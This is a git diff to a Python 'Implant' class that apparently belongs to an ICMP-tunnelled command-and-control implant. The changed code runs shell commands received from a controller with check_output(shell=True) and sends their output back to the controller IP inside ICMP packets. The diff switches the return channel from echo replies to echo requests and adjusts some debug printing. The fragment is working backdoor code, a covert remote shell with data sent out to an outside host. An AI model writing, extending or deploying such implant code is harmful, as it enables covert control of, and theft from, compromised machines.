@@ -65,8 +65,6 @@ class Implant(Host):
         Checks shellpacks for truncated, completed, or none, and passes those on to the exec helper
         """
 
-        print("lalalalal")
-
         if shellpack['target_id'] != self.id:
             return
 
@@ -107,11 +105,12 @@ class Implant(Host):
 
         try:
             output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
-            self.send(self.controller_ip, "instruction", output, icmp_type=0)
+            print(output)
+            self.send(self.controller_ip, "instruction", output, icmp_type=8)
         except TimeoutExpired:
-            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR", icmp_type=0)
+            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR", icmp_type=8)
         except Exception:
-            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR", icmp_type=0)
+            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR", icmp_type=8)
 
 def main():
     # Defines the implant with the controller IP
